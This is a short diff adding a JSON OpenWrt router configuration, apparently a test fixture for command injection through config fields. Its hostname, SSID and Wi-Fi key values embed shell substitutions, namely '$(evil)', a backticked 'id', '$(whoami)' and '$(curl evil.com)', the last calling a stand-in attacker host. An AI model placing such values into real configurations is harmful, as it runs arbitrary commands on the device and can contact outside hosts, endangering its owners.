@@ -1,0 +1,22 @@
+{
+  "packageManager": "opkg",
+  "settings": {
+    "system": {
+      "system": {
+        "_type": "system",
+        "hostname": "OpenWrt-$(evil)",
+        "timezone": "CET-1CEST,M3.5.0,M10.5.0/3"
+      }
+    },
+    "wireless": {
+      "default_radio0": {
+        "_type": "wifi-iface",
+        "device": "radio0",
+        "mode": "ap",
+        "ssid": "TestNet-`id`",
+        "encryption": "sae-mixed",
+        "key": "pa$$w0rd$(whoami)$(curl evil.com)"
+      }
+    }
+  }
+}
